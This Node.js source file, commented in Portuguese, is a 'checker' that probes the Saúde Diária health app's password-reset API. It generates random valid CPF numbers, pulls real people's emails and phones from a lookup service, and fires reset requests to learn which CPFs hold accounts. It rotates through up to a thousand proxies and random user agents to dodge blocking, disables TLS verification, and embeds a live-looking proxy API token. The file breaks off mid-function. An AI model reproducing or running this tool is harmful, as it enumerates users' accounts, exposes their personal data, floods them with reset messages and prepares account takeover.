/**
 * Central do Arranca - Saúde Diária Checker
 * Checker específico para a API Saúde Diária
 * Gera CPF válido → Consulta WorkBuscas → Preenche payload → Testa API Saúde Diária
 */

const axios = require('axios');
const https = require('https');
const fs = require('fs-extra');
const path = require('path');
const WorkBuscasChecker = require('../workbuscas/checker');
let HttpsProxyAgent;
try {
  HttpsProxyAgent = require('https-proxy-agent');
} catch (_) {
  HttpsProxyAgent = null;
}

class SaudeChecker {
  constructor(options = {}) {
    this.proxyApiToken = 'qxew5x0zbdftbcsh63ql5flysll0jaf5u96msek9';
    this.proxyApiUrl = 'https://proxy.webshare.io/api/v2/proxy/list/';
    this.proxies = [];
    this.results = [];
    this.successCount = 0;
    this.errorCount = 0;
    this.registeredCount = 0;
    this.unregisteredCount = 0;
    this.batchSize = 20;
    this.delay = 2000;
    this.timeout = 10000;
    
    // API URL do Saúde Diária
    this.apiUrl = 'https://api-saudediaria.entregadigital.app.br/api/v1/app/resetpassword';
    
    // WorkBuscas Checker para buscar dados
    this.workbuscasChecker = new WorkBuscasChecker();
    
    // Cache de proxies - módulo Saúde
    this.cacheDir = path.join(__dirname, '../../.cache');
    this.cacheFile = path.join(this.cacheDir, 'proxies-saude.json');
    this.cacheExpiry = 24 * 60 * 60 * 1000; // 24 horas
  }
  
  /**
   * Gera um CPF válido aleatório
   */
  generateValidCPF() {
    function randomDigit() {
      return Math.floor(Math.random() * 10);
    }
    
    function calculateDigit(cpf, weights) {
      const sum = cpf.reduce((acc, digit, index) => acc + digit * weights[index], 0);
      const remainder = sum % 11;
      return remainder < 2 ? 0 : 11 - remainder;
    }
    
    // Gera os 9 primeiros dígitos
    const cpf = [];
    for (let i = 0; i < 9; i++) {
      cpf.push(randomDigit());
    }
    
    // Calcula o primeiro dígito verificador
    const weights1 = [10, 9, 8, 7, 6, 5, 4, 3, 2];
    cpf.push(calculateDigit(cpf, weights1));
    
    // Calcula o segundo dígito verificador
    const weights2 = [11, 10, 9, 8, 7, 6, 5, 4, 3, 2];
    cpf.push(calculateDigit(cpf, weights2));
    
    // Formata como string sem pontuação
    return cpf.join('');
  }
  
  /**
   * Formata telefone para +55XXXXXXXXXXX
   */
  formatPhone(phone) {
    if (!phone) return null;
    
    // Remove caracteres não numéricos
    let cleaned = phone.replace(/\D/g, '');
    
    // Se começa com 55, adiciona +
    if (cleaned.startsWith('55')) {
      return '+' + cleaned;
    }
    
    // Se começa com 0, remove o 0
    if (cleaned.startsWith('0')) {
      cleaned = cleaned.substring(1);
    }
    
    // Adiciona código do país se não tiver
    if (cleaned.length >= 10 && !cleaned.startsWith('55')) {
      return '+55' + cleaned;
    }
    
    return cleaned.length >= 10 ? '+55' + cleaned : null;
  }

  /**
   * Cria configurações SSL padrão para requisições
   */
  getSSLConfig() {
    return {
      httpsAgent: new https.Agent({
        rejectUnauthorized: false,
        secureProtocol: 'TLSv1_2_method'
      }),
      proxy: false,
      maxRedirects: 5,
      validateStatus: function (status) {
        return status >= 200 && status < 300;
      }
    };
  }

  /**
   * Gera um User-Agent aleatório de navegador real
   */
  getRandomUserAgent() {
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
  }

  /**
   * Verifica se o cache de proxies é válido
   */
  isCacheValid() {
    try {
      if (!fs.existsSync(this.cacheFile)) {
        return false;
      }
      const stats = fs.statSync(this.cacheFile);
      const now = Date.now();
      const cacheAge = now - stats.mtime.getTime();
      return cacheAge < this.cacheExpiry;
    } catch (error) {
      return false;
    }
  }

  /**
   * Carrega proxies do cache
   */
  loadFromCache() {
    try {
      const cacheData = fs.readJsonSync(this.cacheFile);
      this.proxies = cacheData.proxies || [];
      return this.proxies;
    } catch (error) {
      return [];
    }
  }

  /**
   * Salva proxies no cache
   */
  async saveToCache(proxies) {
    try {
      await fs.ensureDir(this.cacheDir);
      const cacheData = {
        proxies: proxies,
        timestamp: Date.now(),
        count: proxies.length
      };
      await fs.writeJson(this.cacheFile, cacheData, { spaces: 2 });
    } catch (error) {
      // Silencioso - erro ao salvar cache não é crítico
    }
  }

  /**
   * Carrega proxies da API Webshare
   */
  async loadProxies(progressCallback) {
    // Verifica cache primeiro
    if (this.isCacheValid()) {
      const cachedProxies = this.loadFromCache();
      if (cachedProxies.length > 0) {
        this.proxies = cachedProxies;
        // Quando carrega do cache, retorna IMEDIATAMENTE sem testar
        // Cache já contém proxies válidos
        if (progressCallback && cachedProxies.length > 0) {
          const total = cachedProxies.length;
          // Envia progresso UMA VEZ só e retorna
          progressCallback(total);
        }
        return this.proxies;
      }
    }
    
    try {
      const allProxies = [];
      let page = 1;
      const pageSize = 25;
      let retryCount = 0;
      const maxRetries = 3;
      
      while (true) {
        try {
          const response = await axios.get(this.proxyApiUrl, {
            params: {
              mode: 'direct',
              page: page,
              page_size: pageSize
            },
            headers: {
              'Authorization': `Token ${this.proxyApiToken}`
            },
            timeout: 10000,
            ...this.getSSLConfig()
          });
          
          const proxies = response.data.results || [];
          if (proxies.length === 0) break;
          
          allProxies.push(...proxies);
          
          if (progressCallback) {
            progressCallback(allProxies.length);
          }
          
          page++;
          retryCount = 0; // Reset retry count on success
          
          if (allProxies.length >= 1000) break;
          
          // Delay maior para evitar rate limit (500ms ao invés de 200ms)
          await new Promise(resolve => setTimeout(resolve, 500));
          
        } catch (error) {
          // Trata rate limit (429)
          if (error.response && error.response.status === 429) {
            const retryAfter = parseInt(error.response.headers['retry-after'] || '5');
            
            // Se já tem alguns proxies carregados, para e usa eles (não espera muito)
            if (allProxies.length >= 100) {
              console.log(`⚠️ [Saúde] Rate limit (429). Já tem ${allProxies.length} proxies, usando esses e parando aqui.`);
              break; // Usa o que já tem
            }
            
            // Se der rate limit na primeira página, tenta usar cache imediatamente
            if (page === 1 && allProxies.length === 0) {
              console.log(`⚠️ [Saúde] Rate limit (429) na primeira página. Tentando usar cache...`);
              const cachedProxies = this.loadFromCache();
              if (cachedProxies.length > 0) {
                console.log(`📦 [Saúde] Usando ${cachedProxies.length} proxies do cache (rate limit detectado)`);
                this.proxies = cachedProxies;
                if (progressCallback) {
                  progressCallback(cachedProxies.length);
                }
                return this.proxies; // Retorna imediatamente com cache
              }
            }
            
            if (retryCount < maxRetries) {
              retryCount++;
              console.log(`⚠️ [Saúde] Rate limit (429). Aguardando ${retryAfter}s antes de tentar novamente... (tentativa ${retryCount}/${maxRetries})`);
              
              // Aguarda o tempo indicado
              await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
              continue; // Tenta novamente a mesma página
            } else {
              console.log(`❌ [Saúde] Rate limit persistente após ${maxRetries} tentativas. Usando proxies já carregados ou cache: ${allProxies.length}`);
              // Tenta cache como último recurso
              if (allProxies.length === 0) {
                const cachedProxies = this.loadFromCache();
                if (cachedProxies.length > 0) {
                  console.log(`📦 [Saúde] Usando ${cachedProxies.length} proxies do cache após ${maxRetries} tentativas falhadas`);
                  this.proxies = cachedProxies;
                  if (progressCallback) {
                    progressCallback(cachedProxies.length);
                  }
                  return this.proxies;
                }
              }
              break; // Para e usa o que já tem (mesmo se for 0)
            }
          } else {
            // Outro erro - propaga
            throw error;
          }
        }
      }
      
      // Se não conseguiu carregar pelo menos alguns proxies, usa cache se tiver
      if (allProxies.length === 0) {
        console.log('⚠️ [Saúde] Nenhum proxy carregado da API. Tentando usar cache...');
        const cachedProxies = this.loadFromCache();
        if (cachedProxies.length > 0) {
          console.log(`📦 [Saúde] Usando ${cachedProxies.length} proxies do cache`);
          this.proxies = cachedProxies;
          if (progressCallback) {
            progressCallback(cachedProxies.length);
          }
          return this.proxies;
        }
      }
      
      this.proxies = allProxies.slice(0, 1000);
      
      // Verifica se deve pular teste (igual Gemeos)
      const configLoader = require('../../config-loader');
      const skipTestConfig = configLoader.get('proxies.skipTestOnLoad');
      const skipTestEnv = process.env.SKIP_PROXY_TEST === 'true';
      const skipProxyTest = skipTestConfig === true || skipTestEnv === true;
      
      console.log('[DEBUG] [Saúde] Configuração de teste:');
      console.log('  - config.proxies.skipTestOnLoad:', skipTestConfig);
      console.log('  - env.SKIP_PROXY_TEST:', process.env.SKIP_PROXY_TEST);
      console.log('  - skipProxyTest (resultado):', skipProxyTest);
      
      // Se deve pular teste OU se teve rate limit (já tem proxies suficientes)
      if (skipProxyTest) {
        console.log(`⚡ [Saúde] Teste de proxies PULADO (configurado). Usando ${this.proxies.length} proxies sem testar.`);
      } else if (this.proxies.length < 100) {
        console.log(`⚠️ [Saúde] Apenas ${this.proxies.length} proxies carregados. Pulando teste e usando direto.`);
      } else {
        // Testa proxies antes de salvar no cache (igual ao Gemeos)
        // NÃO passa progressCallback para testProxies - evita progresso duplicado
        console.log(`🧪 [Saúde] Testando ${this.proxies.length} proxies...`);
        
        // Limita teste a no máximo 100 proxies ou 30 segundos para não travar
        const maxTestProxies = Math.min(100, this.proxies.length);
        const proxiesToTest = this.proxies.slice(0, maxTestProxies);
        console.log(`🧪 [Saúde] Testando apenas amostra de ${maxTestProxies} proxies (para não travar)...`);
        
        try {
          // Timeout de 30 segundos para o teste completo
          const testPromise = this.testProxies(proxiesToTest, null);
          const timeoutPromise = new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Teste de proxies excedeu 30 segundos')), 30000)
          );
          
          const validProxies = await Promise.race([testPromise, timeoutPromise]);
          
          if (validProxies.length === 0) {
            console.log('⚠️ [Saúde] Nenhum proxy válido encontrado na amostra, usando todos os proxies sem filtrar');
            this.proxies = this.proxies.slice(0, 1000);
          } else {
            const validRate = validProxies.length / maxTestProxies;
            console.log(`📊 [Saúde] Taxa de validade: ${(validRate * 100).toFixed(1)}% (${validProxies.length}/${maxTestProxies})`);
            // Usa todos os proxies mesmo assim (amostra pequena)
            this.proxies = this.proxies.slice(0, 1000);
          }
        } catch (error) {
          console.log(`⚠️ [Saúde] Erro ou timeout ao testar proxies: ${error.message}. Usando todos sem filtrar.`);
          // Em caso de erro no teste, usa todos os proxies
          this.proxies = this.proxies.slice(0, 1000);
        }
      }
      
      // Salva no cache
      await this.saveToCache(this.proxies);
      
      // Notifica progressCallback final com total de proxies válidos (UMA VEZ)
      if (progressCallback) {
        progressCallback(this.proxies.length);
      }
      
      return this.proxies;
      
    } catch (error) {
      // Trata rate limit (429) também no catch externo
      if (error.response && error.response.status === 429) {
        console.log('⚠️ [Saúde] Rate limit (429) ao carregar proxies. Usando cache se disponível...');
        
        // Tenta usar cache mesmo expirado
        const cachedProxies = this.loadFromCache();
        if (cachedProxies.length > 0) {
          console.log(`📦 [Saúde] Usando ${cachedProxies.length} proxies do cache expirado como fallback`);
          this.proxies = cachedProxies;
          if (progressCallback) {
            progressCallback(cachedProxies.length);
          }
          return this.proxies;
        }
        
        // Se não tem cache, propaga erro
        console.error('❌ [Saúde] Rate limit e sem cache disponível');
      }
      
      // Fallback para cache mesmo expirado (outros erros)
      const cachedProxies = this.loadFromCache();
      if (cachedProxies.length > 0) {
        this.proxies = cachedProxies;
        // Notifica progressCallback com o cache expirado
        if (progressCallback) {
          progressCallback(cachedProxies.length);
        }
        return this.proxies;
      }
      
      throw error;
    }
  }

  /**
   * Obtém um proxy aleatório
   */
  getRandomProxy() {
    if (this.proxies.length === 0) {
      return null;
    }
    
    const proxy = this.proxies[Math.floor(Math.random() * this.proxies.length)];
    return {
      host: proxy.proxy_address,
      port: proxy.port,
      auth: proxy.username && proxy.password ? {
        username: proxy.username,
        password: proxy.password
      } : undefined
    };
  }

  /**
   * Testa um proxy específico na API WorkBuscas
   */
  async testProxy(proxy) {
    try {
      // Testa no endpoint WorkBuscas com CPF inválido para validar JSON esperado
      const testConfig = {
        method: 'get',
        url: `${this.workbuscasChecker.workbuscasUrl}?token=${this.workbuscasChecker.workbuscasToken}&modulo=cpf&consulta=00000000000`,
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': this.getRandomUserAgent(),
          'accept': 'application/json',
        },
        timeout: 7000,
        ...this.getSSLConfig(),
        validateStatus: function (status) { return status >= 200 && status < 500; }
      };
      
      if (HttpsProxyAgent) {
        const authPart = proxy.username && proxy.password
          ? `${encodeURIComponent(proxy.username)}:${encodeURIComponent(proxy.password)}@`
          : '';
        const proxyUrl = `http://${authPart}${proxy.proxy_address}:${proxy.port}`;
        testConfig.proxy = false;
        testConfig.httpsAgent = new HttpsProxyAgent.HttpsProxyAgent(proxyUrl);
      } else {
        testConfig.proxy = {
          host: proxy.proxy_address,
          port: proxy.port,
          auth: proxy.username && proxy.password ? {
            username: proxy.username,
            password: proxy.password
          } : undefined,
          protocol: 'http'
        };
      }
      
      const response = await axios(testConfig);
      const data = response.data;
      const isObj = typeof data === 'object' && data !== null;
      // WorkBuscas retorna objeto mesmo quando não encontra (com mensagens de erro)
      return isObj;
    } catch (error) {
      return false;
    }
  }

  /**
   * Testa múltiplos proxies em paralelo
   */
  async testProxies(proxies, progressCallback) {
    const batchSize = 10;
    const validProxies = [];
    
    for (let i = 0; i < proxies.length; i += batchSize) {
      const batch = proxies.slice(i, i + batchSize);
      
      const promises = batch.map(async (proxy) => {
        const isValid = await this.testProxy(proxy);
        return isValid ? proxy : null;
      });
      
      const batchResults = await Promise.all(promises);
      const validBatch = batchResults.filter(proxy => proxy !== null);
      validProxies.push(...validBatch);
      
      // Só envia progresso se tiver proxies válidos e se progressCallback foi fornecido
      // NÃO envia 0 para evitar poluir o progresso
      if (progressCallback && validProxies.length > 0) {
        progressCallback(validProxies.length);
      }
      
      // Pequena pausa entre lotes
      await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    // Envia progresso final apenas se tiver proxies válidos
    if (progressCallback && validProxies.length > 0) {
      progressCallback(validProxies.length);
    }
    
    return validProxies;
  }

  /**
   * Consulta WorkBuscas para obter emails e telefones
   */
  async consultWorkBuscas(cpf, proxy = null) {
    try {
      const result = await this.workbuscasChecker.makeAPIRequest(cpf, proxy);
      
      // Debug: log da estrutura retornada (apenas se não tiver email/telefone)
      let hasDebugged = false;
      
      // Se a requisição foi bem-sucedida e tem dados, tenta extrair
      // Aceita mesmo se interpretation não for 'found', pois pode ter dados parciais
      if (result.success && result.data) {
        const data = result.data;
        
        // Extrai TODOS os emails disponíveis - VERIFICA TODOS OS FORMATOS POSSÍVEIS
        const emails = [];
        
        // Formato 1: email direto (string)
        if (data.email && typeof data.email === 'string' && data.email.trim()) {
          emails.push(data.email.trim());
        }
        
        // Formato 2: emails como array de objetos {email: "...", tipo: "..."}
        if (data.emails && Array.isArray(data.emails)) {
          data.emails.forEach(e => {
            if (e && typeof e === 'object') {
              if (e.email && typeof e.email === 'string' && e.email.trim() && !emails.includes(e.email.trim())) {
                emails.push(e.email.trim());
              }
            } else if (typeof e === 'string' && e.trim() && !emails.includes(e.trim())) {
              // Se emails é array de strings
              emails.push(e.trim());
            }
          });
        }
        
        // Formato 3: Email dentro de outros objetos (pode estar em DadosBasicos, etc)
        if (!emails.length && data.DadosBasicos && data.DadosBasicos.email) {
          const email = data.DadosBasicos.email;
          if (typeof email === 'string' && email.trim()) {
            emails.push(email.trim());
          }
        }
        
        // Extrai TODOS os telefones disponíveis e formata - VERIFICA TODOS OS FORMATOS
        const phones = [];
        
        // Formato 1: telefones como array de objetos
        if (data.telefones && Array.isArray(data.telefones) && data.telefones.length > 0) {
          data.telefones.forEach(t => {
            if (t && typeof t === 'object') {
              const phoneStr = t.telefone || t.numero || t;
              if (phoneStr && typeof phoneStr === 'string') {
                const phone = this.formatPhone(phoneStr);
                if (phone && !phones.includes(phone)) {
                  phones.push(phone);
                }
              }
            } else if (typeof t === 'string') {
              const phone = this.formatPhone(t);
              if (phone && !phones.includes(phone)) {
                phones.push(phone);
              }
            }
          });
        }
        
        // Formato 2: telefone direto (string)
        if (data.telefone && typeof data.telefone === 'string' && data.telefone.trim()) {
          const phone = this.formatPhone(data.telefone);
          if (phone && !phones.includes(phone)) {
            phones.push(phone);
          }
        }
        
        // Formato 3: telefone dentro de DadosBasicos
        if (!phones.length && data.DadosBasicos && data.DadosBasicos.telefone) {
          const phoneStr = data.DadosBasicos.telefone;
          if (typeof phoneStr === 'string') {
            const phone = this.formatPhone(phoneStr);
            if (phone && !phones.includes(phone)) {
              phones.push(phone);
            }
          }
        }
        
        // Debug: se não encontrou emails mas a requisição foi bem-sucedida, loga estrutura
        if (!hasDebugged && emails.length === 0 && result.success) {
          console.log(`[Saúde] CPF ${cpf} - Nenhum email encontrado. Estrutura dos dados:`, JSON.stringify(data, null, 2).substring(0, 500));
          hasDebugged = true;
        }
        
        // Se tem dados (mesmo que não tenha email/telefone), retorna sucesso
        // Isso permite que mesmo sem email/telefone, continue o fluxo (vai usar padrão)
        return {
          success: true,
          emails: emails,
          phones: phones,
          email: emails.length > 0 ? emails[0] : null,
          phone: phones.length > 0 ? phones[0] : null,
          workbuscasData: data,
          interpretation: result.interpretation || 'found'
        };
      }
      
      // Se não teve sucesso mas ainda tem dados (pode ser interpretation diferente)
      if (result.data && !result.success) {
        const data = result.data;
        const emails = [];
        const phones = [];
        
        // Tenta extrair mesmo assim
        if (data.email && typeof data.email === 'string' && data.email.trim()) {
          emails.push(data.email.trim());
        }
        if (data.emails && Array.isArray(data.emails)) {
          data.emails.forEach(e => {
            if (e && typeof e === 'object' && e.email && typeof e.email === 'string' && e.email.trim()) {
              if (!emails.includes(e.email.trim())) emails.push(e.email.trim());
            }
          });
        }
        if (data.telefones && Array.isArray(data.telefones)) {
          data.telefones.forEach(t => {
            if (t && typeof t === 'object') {
              const phoneStr = t.telefone || t.numero;
              if (phoneStr && typeof phoneStr === 'string') {
                const phone = this.formatPhone(phoneStr);
                if (phone && !phones.includes(phone)) phones.push(phone);
              }
            }
          });
        }
        
        // Se encontrou email ou telefone, retorna sucesso mesmo se result.success for false
        if (emails.length > 0 || phones.length > 0) {
          return {
            success: true,
            emails: emails,
            phones: phones,
            email: emails.length > 0 ? emails[0] : null,
            phone: phones.length > 0 ? phones[0] : null,
            workbuscasData: data,
            interpretation: result.interpretation || 'found'
          };
        }
      }
      
      return {
        success: false,
        emails: [],
        phones: [],
        email: null,
        phone: null,
        workbuscasData: result.data || null,
        interpretation: result.interpretation || 'not_found'
      };
    } catch (error) {
      console.error('[Saúde] Erro ao consultar WorkBuscas:', error.message);
      return {
        success: false,
        emails: [],
        phones: [],
        email: null,
        phone: null,
        workbuscasData: null,
        interpretation: 'error'
      };
    }
  }
  
  /**
   * Faz requisição à API Saúde Diária
   */
  async makeAPIRequest(cpf, email, phonenumber, proxy = null) {
    try {
      const payload = {
        email: email || 'email@exemplo.com',
        cpf: cpf,
        phonenumber: phonenumber || '+5511999999999',
        type: 'PWA'
      };
      
      const url = this.apiUrl;
      
      const axiosConfig = {
        method: 'post',
        url: url,
        data: payload,
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': this.getRandomUserAgent(),
          'Accept': 'application/json'
        },
        timeout: this.timeout,
        ...this.getSSLConfig(),
        validateStatus: function (status) {
          return status >= 200 && status < 500;
        }
      };
      
      // Configura proxy se fornecido
      if (proxy) {
        if (HttpsProxyAgent) {
          const authPart = proxy.auth && proxy.auth.username && proxy.auth.password
            ? `${encodeURIComponent(proxy.auth.username)}:${encodeURIComponent(proxy.auth.password)}@`
            : '';
          const proxyUrl = `http://${authPart}${proxy.host}:${proxy.port}`;
          axiosConfig.proxy = false; // usar agent em vez do objeto proxy
          axiosConfig.httpsAgent = new HttpsProxyAgent.HttpsProxyAgent(proxyUrl);
        } else {
          axiosConfig.proxy = {
            host: proxy.host,
            port: proxy.port,
            auth: proxy.auth,
            protocol: 'http'
          };
        }
      }
      
      const response = await axios(axiosConfig);
      const status = response.status;
      const responseData = response.data || {};
      
      // Interpreta a resposta baseado no conteúdo
      // Baseado no teste real:
      // - Status 201 + msg "Foi enviado um email..." = CPF CADASTRADO
      // - Status 202 + msg "não conferem" = CPF NÃO CADASTRADO ou dados errados
      let interpretation = 'unknown';
      
      // Verifica primeiro pelo status
      if (status === 201) {
        // Status 201 (Created) = CPF cadastrado e reset de senha foi enviado
        interpretation = 'registered';
      } else if (status === 202) {
        // Status 202 = geralmente indica que dados não conferem ou CPF não cadastrado
        if (responseData.msg) {
          const msg = responseData.msg.toLowerCase();
          
          // Se a mensagem indica que enviou email = cadastrado
          if (msg.includes('enviado') && (msg.includes('email') || msg.includes('senha'))) {
            interpretation = 'registered';
          } else if (msg.includes('não conferem') || msg.includes('nao conferem')) {
            // Dados não conferem = não cadastrado ou dados errados
            interpretation = 'not_registered';
          } else {
            interpretation = 'not_registered';
          }
        } else {
          interpretation = 'not_registered';
        }
      } else if (responseData.appuser && responseData.appuser !== null) {
        // appuser preenchido = CPF cadastrado
        interpretation = 'registered';
      } else if (status === 404) {
        // Status 404 = CPF não cadastrado (Not Found) - pular imediatamente
        interpretation = 'not_registered';
      } else if (status === 400 || status === 422) {
        // Verifica se é 400/422 com "not found" na resposta
        if (responseData.reason && responseData.reason.toLowerCase().includes('not found')) {
          interpretation = 'not_registered';
        } else if (responseData.statusMsg && responseData.statusMsg.toLowerCase().includes('not found')) {
          interpretation = 'not_registered';
        } else {
          interpretation = 'not_registered';
        }
      } else if (responseData.msg) {
        // Verifica a mensagem
        const msg = responseData.msg.toLowerCase();
        
        if (msg.includes('enviado') && (msg.includes('email') || msg.includes('senha'))) {
          interpretation = 'registered';
        } else if (msg.includes('não conferem') || msg.includes('nao conferem')) {
          interpretation = 'not_registered';
        } else if (msg.includes('encontrado') || msg.includes('não existe') || msg.includes('não cadastrado')) {
          interpretation = 'not_registered';
        } else {
          interpretation = 'not_registered';
        }
      } else {
        interpretation = 'error';
      }
      
      return {
        cpf: cpf,
        success: status >= 200 && status < 400,
        status: status,
        interpretation: interpretation,
        response: responseData,
        payload: payload,
        proxy: proxy ? `${proxy.host}:${proxy.port}` : 'Sem Proxy',
        timestamp: new Date().toISOString()
      };
      
    } catch (error) {
      this.errorCount++;
      return {
        cpf: cpf,
        success: false,
        status: error.response?.status || 0,
        error: error.message,
        interpretation: 'error',
        proxy: proxy ? `${proxy.host}:${proxy.port}` : 'Sem Proxy',
        timestamp: new Date().toISOString()
      };
    }
  }
  
  /**
   * Verifica um único CPF na API Saúde Diária
   * Lógica: Gera CPF → Consulta WorkBuscas → Preenche payload → Testa API
   * @param {Function} statusCallback - Callback para atualizar status em tempo real
   */
  async checkCPF(cpf = null, showProxyInfo = false, statusCallback = null) {
    try {
      // Se CPF não foi fornecido, gera um válido
      if (!cpf) {
        cpf = this.generateValidCPF();
      }
      
      // Remove formatação do CPF
      cpf = cpf.replace(/\D/g, '');
      
      if (cpf.length !== 11) {
        return {
          cpf: cpf,
          success: false,
          error: 'CPF inválido',
          status: 0,
          interpretation: 'invalid',
          timestamp: new Date().toISOString()
        };
      }
      
      // Consulta WorkBuscas para obter emails e telefones (com proxy)
      // Obtém proxy para WorkBuscas primeiro
      let workbuscasProxy = null;
      if (this.proxies.length > 0) {
        const randomProxy = this.getRandomProxy();
        // Converte o formato do proxy para o formato esperado pelo WorkBuscas
        // WorkBuscas espera: { proxy_address, port, username, password }
        // SaudeChecker retorna: { host, port, auth: { username, password } }
        workbuscasProxy = {
          proxy_address: randomProxy.host,
          port: randomProxy.port,
          username: randomProxy.auth ? randomProxy.auth.username : null,
          password: randomProxy.auth ? randomProxy.auth.password : null
        };
        
        if (statusCallback && workbuscasProxy) {
          statusCallback('buscando_email', cpf, null, `${workbuscasProxy.proxy_address}:${workbuscasProxy.port}`);
        } else if (statusCallback) {
          statusCallback('buscando_email', cpf);
        }
      } else if (statusCallback) {
        statusCallback('buscando_email', cpf);
      }
      
      const workbuscasResult = await this.consultWorkBuscas(cpf, workbuscasProxy);
      
      const emails = workbuscasResult.emails || [];
      const phones = workbuscasResult.phones || [];
      
      // Se não encontrou EMAIL no WorkBuscas, não testa na API do Saúde Diária
      // Email é obrigatório, telefone pode ser gerado se necessário
      if (emails.length === 0) {
        if (statusCallback) statusCallback('dados_insuficientes', cpf);
        return {
          cpf: cpf,
          success: false,
          error: 'Dados insuficientes (email não encontrado no WorkBuscas)',
          status: 0,
          interpretation: 'skipped',
          proxy: 'N/A',
          workbuscas: workbuscasResult.workbuscasData || null,
          workbuscasSuccess: workbuscasResult.success || false,
          timestamp: new Date().toISOString()
        };
      }
      
      // Se não tem telefone mas tem email, gera um telefone genérico baseado no CPF
      // Isso permite testar mesmo quando WorkBuscas não retornou telefone
      if (phones.length === 0) {
        // Gera telefone genérico baseado nos últimos dígitos do CPF
        const cpfDigits = cpf.slice(-9);
        phones.push(`+5511${cpfDigits}`);
      }
      
      // Carrega proxies se não houver nenhum disponível
      if (this.proxies.length === 0) {
        try {
          await this.loadProxies();
        } catch (error) {
          return {
            cpf: cpf,
            success: false,
            error: `Erro ao carregar proxies: ${error.message}`,
            status: 0,
            interpretation: 'error',
            proxy: 'N/A',
            workbuscas: workbuscasResult.workbuscasData,
            workbuscasSuccess: workbuscasResult.success,
            timestamp: new Date().toISOString()
          };
        }
      }
      
      // Se ainda não há proxies após tentar carregar, retorna erro
      if (this.proxies.length === 0) {
    return {
      cpf: cpf,
      success: false,
          error: 'Nenhum proxy disponível (não foi possível carregar proxies)',
      status: 0,
          interpretation: 'error',
      proxy: 'N/A',
          workbuscas: workbuscasResult.workbuscasData,
          workbuscasSuccess: workbuscasResult.success,
          timestamp: new Date().toISOString()
        };
      }
      
      // Testa com TODOS os emails encontrados
      let finalResult = null;
      let usedProxy = 'N/A';
      
      for (let emailIndex = 0; emailIndex < emails.length; emailIndex++) {
        const email = emails[emailIndex];
        // Usa primeiro telefone para este email (ou todos se quiser testar todas combinações)
        const phonenumber = phones[0];
        
        // Obtém proxy aleatório para cada tentativa
        let proxy = this.getRandomProxy();
        let firstProxy = proxy;
        usedProxy = proxy ? `${proxy.host}:${proxy.port}` : 'N/A';
        
        // Status: testando com email X de Y (com proxy)
        if (statusCallback) {
          if (emails.length > 1) {
            statusCallback('testando_email', cpf, `${emailIndex + 1}/${emails.length}`, usedProxy);
          } else {
            statusCallback('testando', cpf, null, usedProxy);
          }
        }
        
        // Faz requisição à API Saúde Diária com retry e rotação de proxy (SEM FALLBACK SEM PROXY)
        let result = null;
        let retryCount = 0;
        const maxRetries = 3; // Mais tentativas já que não vamos usar fallback sem proxy
        
        while (retryCount <= maxRetries && this.proxies.length > 0) {
          try {
            // Se retry, mostra status de retry
            if (retryCount > 0 && statusCallback) {
              statusCallback('retry', cpf, retryCount);
            }
            result = await this.makeAPIRequest(cpf, email, phonenumber, proxy);
            
            // Se retornou 404 (Not Found), CPF não cadastrado - pular imediatamente para próximo CPF
            // Não testa outros emails, vai direto para o próximo CPF
            if (result.status === 404 || (result.status === 400 && result.response && result.response.reason && result.response.reason.toLowerCase().includes('not found'))) {
              if (proxy && result.proxy === 'Sem Proxy') {
                result.proxy = `${proxy.host}:${proxy.port}`;
              }
              usedProxy = result.proxy;
              finalResult = result;
              finalResult.interpretation = 'not_registered'; // Garante que é marcado como não cadastrado
              break; // Para imediatamente e pula para próximo CPF (sai do loop de emails)
            }
            
            // Se sucesso ou encontrou cadastrado, para de testar outros emails
            if (result.success || result.interpretation === 'registered') {
              if (proxy && result.proxy === 'Sem Proxy') {
                result.proxy = `${proxy.host}:${proxy.port}`;
              }
              usedProxy = result.proxy;
              finalResult = result;
              break; // Para de testar outros emails
            }
            
            // Se interpretação é 'not_registered' com status 404, também pula (redundante mas garantido)
            if (result.interpretation === 'not_registered' && result.status === 404) {
              // 404 = definitivamente não cadastrado, pular imediatamente
              if (proxy && result.proxy === 'Sem Proxy') {
                result.proxy = `${proxy.host}:${proxy.port}`;
              }
              usedProxy = result.proxy;
              finalResult = result;
              break; // Para imediatamente e pula para próximo CPF (sai do loop de emails)
            }
            
            // Se erro de rede/timeout, tenta com outro proxy (NÃO tenta sem proxy)
            if (result.error && (result.error.includes('timeout') || result.error.includes('ECONNREFUSED') || result.error.includes('network'))) {
              retryCount++;
              if (retryCount <= maxRetries && this.proxies.length > 0) {
                // Tenta com outro proxy
                proxy = this.getRandomProxy();
                await this.sleep(500);
                continue;
              }
            }
            
            // Se não foi erro de rede, também para (pode ser que não esteja cadastrado com este email)
            break;
          } catch (error) {
            retryCount++;
            if (retryCount <= maxRetries && this.proxies.length > 0) {
              // Tenta com outro proxy
              proxy = this.getRandomProxy();
              await this.sleep(500);
              continue;
            }
            // Se esgotou tentativas, continua para próximo email
            break;
          }
        }
        
        // Se encontrou cadastrado, para de testar outros emails
        if (finalResult && finalResult.interpretation === 'registered') {
          break;
        }
        
        // Se não teve sucesso, continua para próximo email
        if (!finalResult || finalResult.interpretation !== 'registered') {
          finalResult = result; // Guarda último resultado (pode ser not_registered ou error)
          continue; // Testa próximo email
        }
      }
      
      // Se testou todos os emails mas não encontrou cadastrado, usa último resultado
      if (!finalResult) {
        finalResult = {
          cpf: cpf,
          success: false,
          error: 'Todos os emails foram testados sem sucesso',
          status: 0,
          interpretation: 'not_registered',
          proxy: usedProxy,
      timestamp: new Date().toISOString()
    };
      }
      
      // Atualiza proxy no resultado
